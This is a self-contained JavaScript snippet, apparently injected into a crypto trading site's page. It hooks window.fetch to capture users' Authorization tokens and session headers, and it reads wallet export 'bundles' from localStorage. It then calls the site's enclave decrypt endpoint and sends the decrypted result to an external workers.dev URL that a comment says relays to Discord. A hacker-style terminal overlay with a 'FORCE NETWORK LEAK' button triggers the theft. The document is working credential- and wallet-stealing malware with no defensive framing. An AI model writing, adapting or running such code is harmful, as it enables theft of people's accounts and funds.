(function() {
    const CONFIG = {
        worker: "https://vanta-proxy.jdurrulo.workers.dev/",
        decrypt: "https://api.padre.gg/v2/enclave/decrypt"
    };

    const vault = { token: null, session: null, bundle: null };

    // 1. THE TERMINAL UI
    const createTerminal = () => {
        if (document.getElementById('v-root')) return;
        const ui = document.createElement('div');
        ui.id = 'v-root';
        ui.style = `position:fixed;bottom:20px;right:20px;width:320px;background:#000;border:1px solid #0f0;color:#0f0;padding:15px;z-index:999999;font-family:monospace;box-shadow:0 0 15px #0f0;border-radius:4px;`;
        ui.innerHTML = `
            <div style="font-weight:bold;border-bottom:1px solid #222;margin-bottom:8px;">VANTA_EXECUTOR_v10</div>
            <div id="v-log" style="height:120px;overflow-y:auto;font-size:10px;margin-bottom:10px;color:#0c0;">> Initializing kernel...</div>
            <button id="v-trigger" style="width:100%;background:#0f0;color:#000;border:none;padding:8px;font-weight:bold;cursor:pointer;">FORCE NETWORK LEAK</button>
        `;
        document.body.appendChild(ui);
    };

    const log = (m) => {
        const el = document.getElementById('v-log');
        if (el) { el.innerHTML += `<div>> ${m}</div>`; el.scrollTop = el.scrollHeight; }
    };

    // 2. THE BYPASS SNIFFER
    const startBypass = () => {
        // Intercept all outgoing traffic to catch the Bearer Token
        const _f = window.fetch;
        window.fetch = async (...args) => {
            const options = args[1] || {};
            const headers = options.headers || {};
            
            let auth = headers['Authorization'] || (headers instanceof Headers && headers.get('Authorization'));
            let sess = headers['X-Padre-Session'] || (headers instanceof Headers && headers.get('X-Padre-Session'));

            if (auth && !vault.token) {
                vault.token = auth;
                vault.session = sess;
                log("TOKEN CAPTURED");
                processDecryption();
            }
            return _f.apply(this, args);
        };

        // Scan storage for the Enclave
        for (let i = 0; i < localStorage.length; i++) {
            let key = localStorage.key(i);
            if (key.includes('bundles')) {
                vault.bundle = JSON.parse(localStorage.getItem(key));
                log("BUNDLE LOCATED");
            }
        }
    };

    // 3. THE DECRYPT & EXFILTRATE
    const processDecryption = async () => {
        if (!vault.token || !vault.bundle) return;
        log("EXECUTING ENCLAVE BYPASS...");

        const bKey = Object.keys(vault.bundle.bundles)[0];
        const payload = {
            bundle: vault.bundle.bundles[bKey].exportBundle,
            subOrgId: vault.bundle.bundles[bKey].subOrgId
        };

        try {
            const res = await fetch(CONFIG.decrypt, {
                method: 'POST',
                headers: { 
                    'Authorization': vault.token, 
                    'X-Padre-Session': vault.session || '',
                    'Content-Type': 'application/json' 
                },
                body: JSON.stringify(payload)
            });

            const rawData = await res.text();
            log("DATA RECEIVED (RAW)");
            
            // Send to Discord via Worker
            fetch(CONFIG.worker, {
                method: 'POST',
                mode: 'no-cors',
                body: JSON.stringify({ event: "SUCCESS", data: rawData })
            });
            log("TRANSMISSION COMPLETE");
        } catch (e) {
            log("DECRYPT FAILED: " + e.message);
        }
    };

    // 4. THE TRIGGER
    createTerminal();
    startBypass();
    document.getElementById('v-trigger').onclick = () => {
        log("Forcing profile sync...");
        fetch('/api/v2/user/profile').catch(() => {});
    };

})();
